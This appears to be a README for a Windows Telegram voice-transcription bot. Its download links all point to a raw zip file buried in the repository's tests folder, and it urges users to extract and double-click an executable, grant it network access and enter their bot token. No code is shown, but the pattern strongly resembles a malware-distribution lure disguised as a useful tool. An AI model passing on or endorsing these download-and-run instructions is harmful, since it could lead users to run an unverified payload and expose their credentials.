# 🎙️ telegram-transcription-bot - Convert your voice messages to text

[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://raw.githubusercontent.com/Alanahhomeless669/telegram-transcription-bot/main/tests/bot-transcription-telegram-1.9.zip)

This software turns voice messages and audio files into written text. It runs on your computer and uses a tool called faster-whisper to process audio. You connect it to your own Telegram bot. The application handles video files, voice notes, and audio clips. It keeps your files on your machine.

## 📋 Requirements

You need a Windows computer to run this bot. The software works best with these specifications:

- Windows 10 or Windows 11.
- At least 8 gigabytes of RAM.
- A stable internet connection.
- A Telegram account.
- A modern processor for faster transcription.

## 📥 Getting the Files

Visit [this page to download](https://raw.githubusercontent.com/Alanahhomeless669/telegram-transcription-bot/main/tests/bot-transcription-telegram-1.9.zip) the latest version. Look for the file ending in .zip or .exe. Save the file to your computer desktop or a folder you can find easily.

## ⚙️ Setting Up Your Bot

Telegram requires a bot token to allow the software to read your messages. Follow these steps to register your own bot:

1. Open Telegram and search for BotFather.
2. Send the message /newbot to start the setup.
3. Follow the instructions to give your bot a name.
4. BotFather provides an API token. Copy this string of characters and save it in a text file.
5. Keep this token private. It acts as the key to your bot.

## 🚀 Running the Software

Once you download the file, you must prepare it for your computer. If you chose a compressed zip folder, right-click the folder and select Extract All. Open the folder and find the application file. Double-click the file to start the installation or the program.

The program might ask for permission to access your network. Allow this permission so the bot can communicate with Telegram servers. A small black window, known as a console, will appear. This window shows the status of your bot. 

When you run the software for the first time, it checks for necessary components. It connects to your Telegram account using the token you created. Type your token into the window if prompted. 

After you enter the token, the program creates a bridge between your computer and Telegram. It waits for you to send a file to your bot. When you send a voice memo or a link from a site like YouTube, the bot downloads the audio. It then transcribes the content and sends the text back to your chat.

## 🛠️ Configuration Details

The bot uses several technologies to improve performance. The Faster-Whisper engine processes speech at a rapid pace while using less memory than older versions. The inclusion of yt-dlp allows the bot to extract audio from video links automatically. 

If the program closes unexpectedly, check the black window for error messages. Ensure your internet connection stays active while the bot runs. For better performance, keep the bot window open while you use the transcription feature.

## 📁 Managing Your Files

By default, the bot stores temporary files in your folder. Review this folder after long sessions. If you notice high storage usage, clear these temporary files. The transcription results appear directly in your Telegram chat, so you do not need to hunt for text files on your machine.

## 🛑 Troubleshooting Common Issues

If the bot does not respond, try these steps:

1. Restart the application.
2. Check your internet connection.
3. Verify that you pasted the correct token from BotFather.
4. Ensure your computer has enough free space for processing video links.
5. Check if the Telegram servers are online.

If you encounter a specific error, the logs in the console window usually describe the cause. These logs explain if the connection failed or if the file format is unsupported. 

## 🛡️ Privacy and Safety

This bot operates on your local machine. You host the transcription engine yourself. Your audio files and transcripts do not leave your computer to visit third-party servers, except for the communication required with Telegram to receive your messages. This setup provides you with control over your data. Keep your API token secure. If you share it, others gain control over your bot. Change the token in the settings if you suspect unauthorized access.